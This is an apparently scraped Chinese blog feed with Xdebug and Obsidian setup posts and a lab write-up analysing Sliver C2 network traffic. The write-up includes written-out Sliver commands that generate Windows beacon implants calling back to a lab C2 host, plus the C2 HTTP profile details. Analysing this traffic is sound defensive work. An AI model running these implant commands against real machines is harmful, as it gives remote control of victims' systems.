class="hljs-attr">xdebug.mode</span>=debug<br></code></pre></td></tr></table></figure><p>注意这里的host，port和idkey需要跟后续phpstorm中的配置保持一致。</p><p>phpstorm配置如下。</p><p>debug port跟php.ini保持一致，可以加上9003，取消勾选force break at first line…</p><p><img src="/2023/04/27/file-upload/-20240520133313856.png" alt="image-20240520133313856"></p><p>DBGp Proxy中配置host，port和idekey：</p><p><img src="/2023/04/27/file-upload/-20240520133420767.png" alt="image-20240520133420767"></p><p>配置一个server：</p><p><img src="/2023/04/27/file-upload/-20240520133452570.png" alt="image-20240520133452570"></p><p>这里的port跟phpstudy中的web端口保持一致即可。</p><p>加上一个run&#x2F;debug configuration:</p><p><img src="/2023/04/27/file-upload/-20240520133534244.png" alt="image-20240520133534244"></p><p>最后在run选项卡下，取消勾选break at first line in PHP scripts：</p><p><img src="/2023/04/27/file-upload/-20240520133625958.png" alt="image-20240520133625958"></p><p>默认为选中状态，会导致在没有任何断点的情况下，直接在每个文件的第一行下断。</p><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>打开监听：</p><p><img src="/2023/04/27/file-upload/-20240520133759361.png" alt="image-20240520133759361"></p><p>直接点击debug，在某函数处下断：</p><p><img src="/2023/04/27/file-upload/-20240520133836977.png" alt="image-20240520133836977"></p><p>直接运行到断点处，并且控制台中打印出了各参数值。</p>]]></content>
    
    
    <categories>
      
      <category>xdebug</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xdebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>obsidian 配置</title>
    <link href="/2024/07/23/obsidian%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/07/23/obsidian%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="obsidian-配置"><a href="#obsidian-配置" class="headerlink" title="obsidian 配置"></a>obsidian 配置</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载地址为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cardlink">url: https://obsidian.md/download<br>title: &quot;Download - Obsidian&quot;<br>description: &quot;Obsidian is available on all major platforms. Download Obsidian for iOS, Android, macOS, Windows and Linux.&quot;<br>host: obsidian.md<br>favicon: /favicon.ico<br>image: https://obsidian.md/images/banner.png<br></code></pre></td></tr></table></figure><p>根据自己的版本下载安装即可。</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p><img src="/2023/04/27/file-upload/ge-20240104153516742.png"><br>安装的第三方如图所示，核心插件按需开启即可，下面简单介绍其中一部分。</p><h3 id="Auto-Card-Link"><a href="#Auto-Card-Link" class="headerlink" title="Auto Card Link"></a>Auto Card Link</h3><p>该插件会将外链的超链接转换成卡片的形式，例如：<br><img src="/2023/04/27/file-upload/ge-20240104153911360.png"></p><h3 id="Calendar-CustomJS-DataView"><a href="#Calendar-CustomJS-DataView" class="headerlink" title="Calendar CustomJS DataView"></a>Calendar CustomJS DataView</h3><p>这些插件可以配合 periodic notes 插件一起来实现日报，周报并自动进行可视化的表格统计，参考项目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cardlink">url: https://github.com/mulfok/periodic-note-templates<br>title: &quot;GitHub - mulfok/periodic-note-templates: A set of periodic note templates for Obsidian.md.&quot;<br>description: &quot;A set of periodic note templates for Obsidian.md. Contribute to mulfok/periodic-note-templates development by creating an account on GitHub.&quot;<br>host: github.com<br>favicon: https://github.githubobsidian.com/favicons/favicon.svg<br>image: https://opengraph.githubobsidian.com/a09ef2c2f3d8bc9cb32ecf0da65dc6bfb3edfd5ea059d183e4ff19fefc6b01f2/mulfok/periodic-note-templates<br></code></pre></td></tr></table></figure><h3 id="Excalidraw"><a href="#Excalidraw" class="headerlink" title="Excalidraw"></a>Excalidraw</h3><p>绘图工具：<br><img src="/2023/04/27/file-upload/ge-20240104155949355.png"></p><h3 id="Minimal-theme-settings"><a href="#Minimal-theme-settings" class="headerlink" title="Minimal theme settings"></a>Minimal theme settings</h3><p>该插件用来针对 minimal 主题进行更为详细的格式设置，例如高亮，行距，对齐等等：<br><img src="/2023/04/27/file-upload/ge-20240104154628211.png"></p><h3 id="图片链接设置"><a href="#图片链接设置" class="headerlink" title="图片链接设置"></a>图片链接设置</h3><p><img src="/2023/04/27/file-upload/ge-20240104154747539.png"><br>在文件与链接中，选择默认存放路径为子文件夹，并设置子文件夹名称，以 obsidian 举例，每个笔记都会在 md 文件的相同目录下生成 obsidian 文件夹来保存图片。<br>记住取消勾选 wiki 链接.</p><h3 id="日记"><a href="#日记" class="headerlink" title="日记"></a>日记</h3><p>日记功能通过自带的核心插件实现。<br><img src="/2023/04/27/file-upload/ge-20240104155145853.png"><br>其中日记模板的位置处填写自定义的日记模板，新建日记的存放位置为日记文件的存档目录(00 开头保证其在置顶位置)，日期格式为日记文件的命名。<br>其中通过设置日期格式为 <code>YYYY/YYYY-MM/YYYY-MM-DD</code> 使其自动创建 YEAR&#x2F;YEAR-MONTH&#x2F;YEAR-MONTH-DAY 的目录结构。如图所示：<br><img src="/2023/04/27/file-upload/ge-20240104155733651.png"></p><h2 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h2><ul><li>主题：minimal</li><li>字体：默认<br>日记模板：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-bullet">-</span>  <span class="hljs-string">checklist</span><br><span class="hljs-bullet">-</span> [ ] <span class="hljs-string">DONE&amp;DOING&amp;TODO</span><br><span class="hljs-bullet">-</span> [ ] <span class="hljs-string">Email</span><br><span class="hljs-bullet">-</span> [ ] <span class="hljs-string">Vulnerability</span> <span class="hljs-string">Update</span><br><span class="hljs-bullet">-</span> [ ] <span class="hljs-string">Medium</span> <span class="hljs-string">Update</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-bullet">-</span>  <span class="hljs-string">work</span><br><span class="hljs-bullet">-</span> [ ] <span class="hljs-string">TODO...</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-bullet">-</span> <span class="hljs-string">study</span><br><span class="hljs-bullet">-</span> [ ] <span class="hljs-string">TODO...</span><br><br><br><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sliver流量分析</title>
    <link href="/2024/07/23/sliver%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <url>/2024/07/23/sliver%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="sliver流量分析"><a href="#sliver流量分析" class="headerlink" title="sliver流量分析"></a>sliver流量分析</h1><h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><p>Sliver中，共有四种协议可供选择：</p><ul><li>http</li><li>wireguard</li><li>dns</li><li>mtls</li></ul><h2 id="DNS环境搭建"><a href="#DNS环境搭建" class="headerlink" title="DNS环境搭建"></a>DNS环境搭建</h2><p>为了后续的实验方便，首先搭建一个DNS服务器。大致的流程如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-------------------+                              +-------------------+<br>|<span class="hljs-string">                   </span>|<span class="hljs-string">                 Resolve DNS  </span>|<span class="hljs-string">                   </span>|<br>|<span class="hljs-string">     DNS Server    +---UDP-53 &lt;-------------------+      Target       </span>|<br>|<span class="hljs-string">      (Ubuntu)      </span>|<span class="hljs-string">                              </span>|<span class="hljs-string">     (Windows)     </span>|<br>|<span class="hljs-string">                   </span>|<span class="hljs-string">                              </span>|<span class="hljs-string">                   </span>|<br>|<span class="hljs-string">  192.168.122.185  </span>|<span class="hljs-string">                +-------------+  192.168.122.160  </span>|<br>|<span class="hljs-string">                   </span>|<span class="hljs-string">                </span>|<span class="hljs-string">             </span>|<span class="hljs-string">                   </span>|<br>+-------------------+                |<span class="hljs-string">             +---+----------+----+</span><br><span class="hljs-string">                                     </span>|<span class="hljs-string">                 </span>|<span class="hljs-string">          </span>|<br>                    Download binary  |<span class="hljs-string">                 </span>|<span class="hljs-string">          </span>|<br>                +--------------------+                 |<span class="hljs-string">          </span>|<br>                |<span class="hljs-string">                                      </span>|<span class="hljs-string">          </span>|<br>                v                                      |<span class="hljs-string">          </span>|<br>              TCP-80                                   |<span class="hljs-string">          </span>|<br>+---------------+---+                                  |<span class="hljs-string">          </span>|<br>|<span class="hljs-string">                   </span>|<span class="hljs-string">               mTLS C2 Connection </span>|<span class="hljs-string">          </span>|<br>|<span class="hljs-string">     C2 Server     +---TCP-8888 &lt;---------------------+          </span>|<br>|<span class="hljs-string">      (kali)      </span>|<span class="hljs-string">                                             </span>|<br>|<span class="hljs-string">                   </span>|<span class="hljs-string">                 WireGuard C2 Connection     </span>|<br>|<span class="hljs-string">  192.168.122.111  +---UDP-53  &lt;---------------------------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string">                   </span>|<br>+-------------------+<br></code></pre></td></tr></table></figure><p>这里的DNS服务器使用Ubuntu20.04进行搭建。</p><p>首先安装bind，<code>apt-get install bind9 bind9utils bind9-doc</code>:</p><p><img src="/2023/04/27/file-upload/ic/image-20231026132449979.png" alt="image-20231026132449979"></p><p>bind的配置文件在&#x2F;etc&#x2F;bind中，对&#x2F;etc&#x2F;bind&#x2F;named.conf.options进行修改：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs abnf">acl <span class="hljs-string">&quot;localnet&quot;</span> &#123;<br>        <span class="hljs-number">192.168</span>.<span class="hljs-number">122.0</span>/<span class="hljs-number">24</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br><br><br>options &#123;<br>        directory <span class="hljs-string">&quot;/var/cache/bind&quot;</span><span class="hljs-comment">;</span><br><br>        recursion yes<span class="hljs-comment">;                     # resursive queries</span><br>        allow-recursion &#123; localnet<span class="hljs-comment">; &#125;;     # recursive queries</span><br><br>        listen-on &#123; <span class="hljs-number">192.168</span>.<span class="hljs-number">122.185</span><span class="hljs-comment">; &#125;;    # IP address of the DNS server</span><br>        allow-transfer &#123; none<span class="hljs-comment">; &#125;;          # disable zone transfers</span><br><br>        forwarders &#123;<br>                <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><span class="hljs-comment">;</span><br>                <span class="hljs-number">8.8</span>.<span class="hljs-number">4.4</span><span class="hljs-comment">;</span><br>        &#125;<span class="hljs-comment">;</span><br><br>        dnssec-validation auto<span class="hljs-comment">;</span><br><br>        listen-on-v6 &#123; any<span class="hljs-comment">; &#125;;</span><br>&#125;<span class="hljs-comment">;</span><br><br>logging &#123;<br>        channel query &#123;<br>            file <span class="hljs-string">&quot;/var/log/bind/query&quot;</span> versions <span class="hljs-number">5</span> size <span class="hljs-number">10</span>M<span class="hljs-comment">;</span><br>            print-time yes<span class="hljs-comment">;</span><br>            severity info<span class="hljs-comment">;</span><br>        &#125;<span class="hljs-comment">;</span><br><br>        category queries &#123; query<span class="hljs-comment">; &#125;;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里需要根据自己的网段进行修改，在配置中允许递归查询。将dns server配置为192.168.122.185，并且不允许区域传输。</p><p>logging部分的配置确保所有的DNS查询都会记录到&#x2F;var&#x2F;log&#x2F;bind&#x2F;query中。</p><p>下面新建目录并且做权限修改，确保其可写：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">mkdir</span> -p /var/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">bind</span><br><span class="hljs-keyword">chown</span> <span class="hljs-keyword">bind</span> /var/<span class="hljs-keyword">log</span>/<span class="hljs-keyword">bind</span><br></code></pre></td></tr></table></figure><p>在&#x2F;etc&#x2F;apparmor.d&#x2F;usr.sbin.named文件中加入如下内容来将目录加进白名单：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/bind/</span>** rw,<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/bind/</span> rw,<br></code></pre></td></tr></table></figure><p>重启apparmor：<code>systemctl restart apparmor</code></p><p>创建zones文件夹来保存区域文件(<code>systemctl restart apparmor</code>)并且通过修改&#x2F;etc&#x2F;bind&#x2F;name.conf.local文件来指定网络的正反向区域:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">zone <span class="hljs-string">&quot;labnet.local&quot;</span> &#123;<br>    type master<span class="hljs-comment">;</span><br>    file <span class="hljs-string">&quot;/etc/bind/zones/db.labnet.local&quot;</span><span class="hljs-comment">;   # zone file path</span><br>&#125;<span class="hljs-comment">;</span><br><br>zone <span class="hljs-string">&quot;122.168.192.in-addr.arpa&quot;</span> &#123;<br>    type master<span class="hljs-comment">;</span><br>    file <span class="hljs-string">&quot;/etc/bind/zones/db.122.168.192&quot;</span><span class="hljs-comment">;    # 192.168.122.0/24</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>下面对&#x2F;etc&#x2F;bind&#x2F;zones&#x2F;db.labnet.local和&#x2F;etc&#x2F;bind&#x2F;zones&#x2F;db.122.168.192两个文件进行配置：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$TTL    <span class="hljs-number">604800</span><br>@       <span class="hljs-keyword">IN</span>      SOA     ns.labnet.<span class="hljs-built_in">local</span>. admin.labnet.<span class="hljs-built_in">local</span>. (<br>                              <span class="hljs-number">4</span>         ; Serial<br>                         <span class="hljs-number">604800</span>         ; Refresh<br>                          <span class="hljs-number">86400</span>         ; Retry<br>                        <span class="hljs-number">2419200</span>         ; Expire<br>                         <span class="hljs-number">604800</span> )       ; Negative <span class="hljs-keyword">Cache</span> TTL<br><br>; name servers - NS <span class="hljs-keyword">records</span><br>    <span class="hljs-keyword">IN</span>      NS      ns.labnet.<span class="hljs-built_in">local</span>.<br><br>; name servers - A <span class="hljs-keyword">records</span><br>ns.labnet.<span class="hljs-built_in">local</span>.          <span class="hljs-keyword">IN</span>      A       <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.185</span><br><br>; <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> - A <span class="hljs-keyword">records</span><br>target.labnet.<span class="hljs-built_in">local</span>.        <span class="hljs-keyword">IN</span>      A      <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.160</span><br>sliver.labnet.<span class="hljs-built_in">local</span>.        <span class="hljs-keyword">IN</span>      A      <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.111</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs llvm">$TTL    <span class="hljs-number">604800</span><br>@       IN      SOA     ns.labnet.local. admin.labnet.local. (<br>                              <span class="hljs-number">4</span>         <span class="hljs-comment">; Serial</span><br>                         <span class="hljs-number">604800</span>         <span class="hljs-comment">; Refresh</span><br>                          <span class="hljs-number">86400</span>         <span class="hljs-comment">; Retry</span><br>                        <span class="hljs-number">2419200</span>         <span class="hljs-comment">; Expire</span><br>                         <span class="hljs-number">604800</span> )       <span class="hljs-comment">; Negative Cache TTL</span><br><br><span class="hljs-comment">; name servers</span><br>      IN      NS      ns.labnet.local.<br><br><span class="hljs-comment">; PTR Records</span><br><span class="hljs-number">105</span>   IN      PTR     ns.labnet.local.        <span class="hljs-comment">; 192.168.122.185</span><br><span class="hljs-number">160</span>   IN      PTR     <span class="hljs-keyword">target</span>.labnet.local.    <span class="hljs-comment">; 192.168.122.160</span><br><span class="hljs-number">111</span>   IN      PTR     sliver.labnet.local.    <span class="hljs-comment">; 192.168.122.111</span><br></code></pre></td></tr></table></figure><p>全部配置完成后，通过如下命令进行检查：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">named</span>-checkconf<br><span class="hljs-keyword">named</span>-checkzone labnet.<span class="hljs-keyword">local</span> /etc/<span class="hljs-keyword">bind</span>/zones/db.labnet.<span class="hljs-keyword">local</span><br><span class="hljs-keyword">named</span>-checkzone <span class="hljs-number">192.168</span><span class="hljs-number">.122</span>.<span class="hljs-keyword">in</span>-addr.arpa /etc/<span class="hljs-keyword">bind</span>/zones/db<span class="hljs-number">.122</span><span class="hljs-number">.168</span><span class="hljs-number">.192</span><br></code></pre></td></tr></table></figure><p>如果出现如下响应表示配置成功：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026133634126.png" alt="image-20231026133634126"></p><p>接下来重启bind并且到sliver server端进行验证：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">systemctl restart <span class="hljs-keyword">bind9</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">dig </span>+<span class="hljs-keyword">short </span>@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">185</span> target.labnet.local<br><span class="hljs-keyword">dig </span>+<span class="hljs-keyword">short </span>@<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">185</span> -x <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">160</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ic/image-20231026133909409.png" alt="image-20231026133909409"></p><p>在dns服务器端应该看到如下两条记录：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026133956384.png" alt="image-20231026133956384"></p><p>最后，在受害主机windows上，配置dns服务器：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026134208794.png" alt="image-20231026134208794"></p><p>通过域名访问sliver server：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026134350020.png" alt="image-20231026134350020"></p><p>至此，所有配置全部完成。</p><h2 id="mtls"><a href="#mtls" class="headerlink" title="mtls"></a>mtls</h2><p>首先生成一个beacon。</p><p><code>generate beacon --os windows --arch amd64 --format exe --seconds 5 --mtls sliver.labnet.local</code></p><p><img src="/2023/04/27/file-upload/ic/image-20231026134636714.png" alt="image-20231026134636714"></p><p>开启监听后，在windows主机上执行implant，并开启wireshark监听：</p><p>首先进行dns的解析：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026135714696.png" alt="image-20231026135714696"></p><p>往后找，看到TLS的client hello：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026140653435.png" alt="image-20231026140653435"></p><p>再次看到dns server的名称。</p><p>这里的reset报文是因为implant是beacon形式，每隔一段时间进行连接：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026143407414.png" alt="image-20231026143407414"></p><h2 id="wireguard"><a href="#wireguard" class="headerlink" title="wireguard"></a>wireguard</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">generate <span class="hljs-attr">--os</span> windows <span class="hljs-attr">--arch</span> amd64 <span class="hljs-attr">--format</span> exe <span class="hljs-attr">--save</span> /tmp/implant-wireguard<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--wg</span> sliver<span class="hljs-selector-class">.labnet</span><span class="hljs-selector-class">.local</span>,<span class="hljs-number">192.168</span>.<span class="hljs-number">122.111</span><br></code></pre></td></tr></table></figure><p>生成implant后上线，首先同样是dns server：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026144457832.png" alt="image-20231026144457832"></p><p>剩下全是畸形的dns报文（malformed packet）：</p><p><img src="/2023/04/27/file-upload/ic/image-20231026144628353.png" alt="image-20231026144628353"></p><h2 id="HTTP代理环境搭建"><a href="#HTTP代理环境搭建" class="headerlink" title="HTTP代理环境搭建"></a>HTTP代理环境搭建</h2><p>mtls和wg协议固然是不错的选择，但并非所有环境都允许建立这两种连接。有时目标与外部的网络连接会受到限制，例如流量允许通过，但需要通过代理，在代理处流量又可能会被记录和检查。在这种情况下，必须使用HTTP和HTTPS协议。</p><p>为了模拟环境，只允许HTTP代理流量进出，在原先的实验环境DNS服务器上添加HTTP代理工具，这里选择 squid 工具。</p><p>首先安装squid: <code>apt-get install squid</code></p><p>安装后修改配置文件<code>/etc/squid/squid.conf</code>，创建一个acl，并且赋予HTTP权限，再配置上DNS解析：</p><p><img src="/2023/04/27/file-upload/ic/image-20231103132600156.png" alt="image-20231103132600156"></p><p>随后重启squid，<code>systemctl restart squid</code>，并且到sliver C2 server上测试一下连通性：</p><p><code>curl -six http://192.168.122.185:3128 https://www.baidu.com/ | head -n </code></p><p><img src="/2023/04/27/file-upload/ic/image-20231103132733003.png" alt="image-20231103132733003"></p><p>接下来到windows受害主机上配置一下代理：</p><img src="sliver_traffic/image-20231103134119835.png" alt="image-20231103134119835" style="zoom:50%;" /><p>修改防火墙策略：</p><img src="sliver_traffic/image-20231103134226320.png" alt="image-20231103134226320" style="zoom:50%;" /><p>出站连接改为组织，最后配置两条出战策略，分别为TCP 3128端口和UDP 53端口。</p><img src="sliver_traffic/image-20231103134530930.png" alt="image-20231103134530930" style="zoom:50%;" /><p>访问日志保存在文件<code>/var/log/squid/access.log</code>中。</p><h2 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h2><p>生成一个beacon implant:</p><p><code>generate beacon --http sliver.labnet.local,sliver.labnet.local?driver=wininet --seconds 5</code></p><p>这里的driver&#x3D;wininet代表使用wininet驱动进行通信。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">在Sliver中，HTTP驱动程序用于生成基于HTTP协议的beacon，并与Sliver服务器进行通信。HTTP驱动程序默认实现是纯Go实现的，但在某些情况下，纯Go实现的HTTP驱动程序可能无法正常工作，例如在使用某些代理服务器或防火墙时。此时，Sliver会尝试使用<span class="hljs-string">&quot;wininet&quot;</span>驱动程序，该驱动程序依赖于本地Windows WinInet API。这个驱动程序通常比纯Go实现的HTTP驱动程序更可靠，因为它使用操作系统提供的底层网络功能，可以更好地处理一些复杂的网络环境。<br></code></pre></td></tr></table></figure><p>同时在sliver server中开启一个http和https的监听。</p><p>在https和http监听同时开启的情况下，优先会选择https，下面先看https的分析。</p><p><img src="/2023/04/27/file-upload/ic/image-20231103135603743.png" alt="image-20231103135603743"></p><p>可以看到，在第一个数据包中，返回了400，这是因为其内置的驱动未能请求成功，往后翻：</p><p><img src="/2023/04/27/file-upload/ic/image-20231103135704764.png" alt="image-20231103135704764"></p><p>可见的明文中几乎只有CONNECT，这里请求的url是server的域名，并且返回200，成功建立了连接。</p><p>这里即使很多数据包是HTTP的请求，但是内容也不可见，是因为Sliver实现了自己的传输加密方案，所有通过HTTP等纯文本通道发送的数据都无法读取。</p><p>kill掉https的监听后，beacon会自动连接到http上，这里的内容大部分也是不可读：</p><p><img src="/2023/04/27/file-upload/ic/image-20231103140304522.png" alt="image-20231103140304522"></p><p>但是会出现很多相似的url：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">/signin.php?i=u46099k191<br><span class="hljs-regexp">/jscript/</span>jscript/route.js?x=<span class="hljs-number">10638697</span><br><span class="hljs-regexp">/database/</span>database<span class="hljs-regexp">/oauth/</span>db/api.php?g=l70700395<br><span class="hljs-regexp">/javascript/</span>js<span class="hljs-regexp">/assets/</span>scripts<span class="hljs-regexp">/js/</span>route.js?n=<span class="hljs-number">97517432</span><br><span class="hljs-regexp">/scripts/</span>bundles<span class="hljs-regexp">/assets/</span>scripts<span class="hljs-regexp">/bundles/um</span>d<span class="hljs-regexp">/assets/</span>jquery.js?u=<span class="hljs-number">4174480</span><br><span class="hljs-regexp">/oauth2/</span>oauth2callback<span class="hljs-regexp">/oauth2/</span>authenticate/signin.php?d=<span class="hljs-number">86673</span>m805<br>...<br></code></pre></td></tr></table></figure><p>在日志中可能更为直观：</p><p><img src="/2023/04/27/file-upload/ic/image-20231103140724248.png" alt="image-20231103140724248"></p><p>请求php或者js文件，并且带上一个随机数。这里的路径是由配置文件来控制的，除此之外，所有的GET和POST请求在URL中都带有一个随机数，其名称是一个随机选择的字符，其值也是一个随机字符串。这些随机参数引入是为了绕过浏览器缓存机制，如果多次发送相同的请求，服务器会返回缓存的响应，这就可能会导致C2的失效中断。</p><p>将日志文件进行处理后，可以看到请求的路径是由如下内容进行自由拼接：</p><p><img src="/2023/04/27/file-upload/ic/image-20231117101228309.png" alt="image-20231117101228309"></p><h3 id="C2-HTTP配置"><a href="#C2-HTTP配置" class="headerlink" title="C2 HTTP配置"></a>C2 HTTP配置</h3><p>配置文件路径为&#x2F;root&#x2F;.sliver&#x2F;configs&#x2F;http-c2.json</p><p><img src="/2023/04/27/file-upload/ic/image-20231117102957726.png" alt="image-20231117102957726"></p><p>其中implant_config部分指定了以HTTP协议通信时，交互轮询等使用到的文件名，路径，文件后缀等等。</p><p>例如Sliver启动session时，用到的文件后缀为html：</p><p><img src="/2023/04/27/file-upload/ic/image-20231117103535666.png" alt="image-20231117103535666"></p><p>而文件路径部分，再结合上面筛选出的路径，也可以发现是一致的。</p><p>而server_config部分则是配置了server端响应的内容：</p><p><img src="/2023/04/27/file-upload/ic/image-20231117103717100.png" alt="image-20231117103717100"></p><p>以cookie字段举例：<br><img src="/2023/04/27/file-upload/ic/image-20231117104205435.png" alt="image-20231117104205435"></p><p>至此，http协议的流程如下：</p><ul><li>首先是beacon.Init()初始化循环，以一个POST请求来完成，并且以start_session_file_ext的值为后缀名，默认为html。</li><li>beacon.Send()进行注册，同样是POST请求，url由配置文件中的session_paths,session_files和session_file_ext来指定。</li><li>在心跳包的时间间隔内，首先发送一个POST进行检查，然后由GET接受信息，POST请求和前面一样，而GET请求的配置则是来源于poll_paths,poll_files和poll_file_ext。</li></ul><p><img src="/2023/04/27/file-upload/ic/image-20231117105927681.png" alt="image-20231117105927681"></p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>在DNS 